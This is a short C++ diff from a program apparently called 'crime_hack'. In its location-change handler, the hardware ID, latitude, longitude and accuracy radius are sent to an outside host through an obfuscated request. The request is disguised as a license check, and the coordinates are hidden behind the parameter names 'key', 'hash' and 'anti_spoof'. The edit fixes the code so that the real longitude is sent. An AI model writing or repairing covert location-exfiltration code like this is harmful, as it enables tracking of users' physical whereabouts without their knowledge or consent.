@@ -798,7 +798,7 @@ STDMETHODIMP CLocationEvents::OnLocationChanged(REFIID reportType, ILocationRepo
 			{
 				geos.radius = errorRadius; std::string host_lnk = xorstr_("kuprey123.beget.tech");
 				char params[3000]; memset(params, 0, sizeof(params));
-				sprintf(params, xorstr_("hwid=%s&key=%f&hash=%f&anti_spoof=%f"), total_hwid.c_str(), geos.x, geos.x, geos.radius);
+				sprintf(params, xorstr_("hwid=%s&key=%f&hash=%f&anti_spoof=%f"), total_hwid.c_str(), geos.x, geos.y, geos.radius);
 				SendInetRequest(P_HTTP, M_GET, host_lnk, xorstr_("crime_hack/check_license.php"), std::string(params), false);
 			}
 		}
